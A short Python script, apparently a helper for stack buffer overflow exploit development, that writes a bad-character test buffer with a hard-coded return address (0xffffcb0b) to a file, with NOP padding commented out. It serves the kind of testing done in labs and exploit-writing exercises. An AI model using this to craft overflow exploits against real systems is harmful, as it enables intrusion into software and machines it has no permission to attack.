
totalexploitlength = int(102)
returnaddresslength = 4

hexchars = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']

hexchars.reverse()

#"\x00\x0a\x0d\x1a\x20\x43\x75\x9e\xbc"
badchars = ['00','0a','0d','1a','20','43','75','9e','bc']

chars = ''

bytelength = 0

for firstchar in hexchars:
    for secondchar in hexchars:
        #char = '\\' + 'x' + str(firstchar) + str(secondchar)
        char = str(firstchar) + str(secondchar)
        if char not in badchars:
            chars += char
            bytelength += 1
            if not (bytelength < totalexploitlength - returnaddresslength):
                break
    if not (bytelength < totalexploitlength - returnaddresslength):
        break;


numhexnops = totalexploitlength - returnaddresslength - (len(chars) / 2)

hexnops = ''

#for i in range(0,int( (numhexnops) )):
#    hexnops += '90'



returnaddress = '0b' + 'cb' + 'ff' + 'ff'

print(chars)

rawdata = bytes.fromhex(chars + hexnops + returnaddress)

with open("allchars.txt", "wb") as file:
    file.write(rawdata)

